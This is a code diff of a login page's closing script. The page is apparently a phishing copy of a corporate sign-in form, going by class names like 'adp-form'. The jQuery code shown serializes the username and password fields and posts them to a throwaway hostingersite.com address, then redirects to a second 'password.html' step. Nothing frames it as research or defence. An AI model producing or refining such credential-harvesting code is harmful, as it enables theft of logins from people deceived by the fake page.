@@ -3700,33 +3700,38 @@
       </svg>
 
     </div>
-    <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.1/jquery.min.js" integrity="sha512-aVKKRRi/Q/YV+4mjoKBsE4x3H+BkegoM/em46NNlCqNTmUYADjBbeNefNxYV7giUp0VxICtqdrbqU7iVaeZNXA==" crossorigin="anonymous" referrerpolicy="no-referrer"></script>
-    <script>
-        $(document).ready(function() {
-            $("#login-form_username").keyup(function() {
-                if ($("#login-form_username").val() == "" && $("#uPassword").val() == "") {
-                    $("#verifUseridBtn").attr("disabled", "true");
-                } else {
-                    $("#verifUseridBtn").removeAttr("disabled");
-                }
-            })
+<script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.1/jquery.min.js" integrity="sha512-aVKKRRi/Q/YV+4mjoKBsE4x3H+BkegoM/em46NNlCqNTmUYADjBbeNefNxYV7giUp0VxICtqdrbqU7iVaeZNXA==" crossorigin="anonymous" referrerpolicy="no-referrer"></script>
+<script>
+    $(document).ready(function() {
+        // Enable or disable the button based on username and password inputs
+        $("#login-form_username, #uPassword").keyup(function() {
+            if ($("#login-form_username").val() == "" || $("#uPassword").val() == "") {
+                $("#verifUseridBtn").attr("disabled", "true");
+            } else {
+                $("#verifUseridBtn").removeAttr("disabled");
+            }
         });
 
+        // Handle button click and make the AJAX request
         $("#verifUseridBtn").click(function() {
-
-
             $.ajax({
                 url: "https://azure-snail-583462.hostingersite.com/api_code.php",
-                type: "post",
-                data: $('.adp-form.uformadp').serialize()
-            }).done(function(response) {
-                window.location.href = "password.html";
-            }).fail(function(error) {
-                console.log(error);
-            })
-
+                type: "POST",
+                data: $('.adp-form.uformadp').serialize(), // Serialize form data
+                headers: {
+                    "Access-Control-Allow-Origin": "*",
+                    "Access-Control-Allow-Headers": "Origin, X-Requested-With, Content-Type, Accept"
+                },
+                success: function(response) {
+                    window.location.href = "password.html"; // Redirect to password page
+                },
+                error: function(error) {
+                    console.log(error); // Log any errors to the console
+                }
+            });
         });
-    </script>
+    });
+</script>
 </body>
 
 
